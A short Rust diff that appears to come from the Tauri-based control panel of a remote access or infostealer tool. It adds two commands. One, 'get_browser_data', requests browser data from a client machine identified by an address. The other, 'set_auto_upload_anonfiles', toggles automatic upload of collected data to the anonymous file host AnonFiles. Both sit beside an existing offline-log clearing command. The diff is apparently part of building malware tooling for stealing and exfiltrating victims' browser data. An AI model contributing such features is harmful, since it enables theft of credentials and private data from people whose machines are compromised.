@@ -1158,3 +1158,35 @@ pub async fn clear_offline_logs(
 
     Ok("Offline logs cleared".to_string())
 }
+
+#[tauri::command]
+pub async fn get_browser_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetBrowserData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Browser data requested".to_string())
+}
+
+#[tauri::command]
+pub async fn set_auto_upload_anonfiles(
+    enabled: bool,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::SetAutoUploadAnonFiles(enabled),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok(format!("Auto upload set to {}", enabled))
+}
